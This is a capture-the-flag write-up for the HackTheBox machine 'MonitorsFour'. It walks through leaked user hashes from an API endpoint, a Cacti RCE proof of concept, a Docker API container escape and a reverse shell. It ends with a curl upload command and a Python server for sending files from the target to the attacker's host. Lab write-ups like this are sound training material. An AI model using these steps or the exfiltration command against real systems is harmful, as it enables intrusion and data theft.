# MonitorsFour: HackTheBox

Difficulty: Easy (personally, felt like a medium)

## Enumeration

- Port Scan reveals only port 80
- So we explore port 80 having domain name **monitorsfour.htb**.
- This has nothing as of yet, but on fuzzing there's some interesting stuff, namely the users endpoint.
- There is also an exposed .env file, which will be useful later.
- Since we are unable to login to the admin panel, I fuzzed vhosts to find the **cacti.monitorsfour.htb** endpoint.
- This is run by cacti 1.2.28, which is vulnerable to Authenticated RCE.


## Initial Foothold

- So [this exploit](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC/blob/main/exploit.py) can get us a shell, but no way to login to the cacti admin either.
- We will instead use the `arjun` tool to check the `/users` endpoint of the root subdomain. This will yield us this particular link `http://monitorsfour.htb/users?token=0`, which contains the usernames and hashed passwords of the users.

```json
[{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"64638044fc8af4b90e","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75000.00"},{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"},{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"}]
```

- We will enter the passwords into crackstation which yields the password of the admin, which is `[censored cuz please try urself]`.
- The username for this will be `marcus` (don't ask me how, I literally guessed ts).
- So we can use these credentials with the [PoC](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC/blob/main/exploit.py) given above to gain a shell.
- The user flag can be found in /home/marcus.

## Privilege Escalation

- As you notice, we are in a docker container. So we have to figure out how to escape it.
- On using linpeas we can get db credentials but it's of no real use.
- The method to do this is to check /etc/resolv.conf, since this is a docker container, it contains the host IP it is exposed to.
- Use [fscan](https://github.com/shadow1ng/fscan/releases) to download the static binary and upload it to the container. This will allow us to discover open ports (this part, is from another writeup, I just googled the recent docker CVEs in my search and the CVE that I am about to show popped up, which magically worked 😂😂).
- We find that port 2375 is running, which means that this is likely vulnerable to [CVE-2025-9074](https://github.com/xwpdx0/poc-2025-9074/tree/main).
- Download the C file, compile it and upload it to the vm.
- Now all we need to do is run the compiled binary and enter the IP we found in resolv.conf. Port will be 2375.
- Using this, spawn a reverse shell and do 

```bash
cat hostc/Users/Administrator/Desktop/root.txt
```
This gives root.

## Interesting Tidbit

For this machine, I needed a way to upload files back onto my vm, since I didn't really have any tools to do so. While you can use existing tools, I thought it'd be fun to code this simple server up. 

To upload a file from the target vm to your vm all you have to do is

```bash
curl -T filename http://yourip:yourport
```

Source code:

```python
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
import os

UPLOAD_DIR = "uploads"

class UploadHandler(BaseHTTPRequestHandler):
    def do_PUT(self):
        self.save_file()

    def do_POST(self):
        self.save_file()

    def save_file(self):
        os.makedirs(UPLOAD_DIR, exist_ok=True)

        length = int(self.headers.get('Content-Length', 0))
        filename = os.path.basename(self.path)
        if not filename:
            filename = "upload.bin"

        filepath = os.path.join(UPLOAD_DIR, filename)

        with open(filepath, "wb") as f:
            f.write(self.rfile.read(length))

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK\n")

    def log_message(self, format, *args):
        return  # silence logs


if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 8000), UploadHandler)
    print("Upload server listening on port 8000...")
    server.serve_forever()
```

Happy Hacking :)
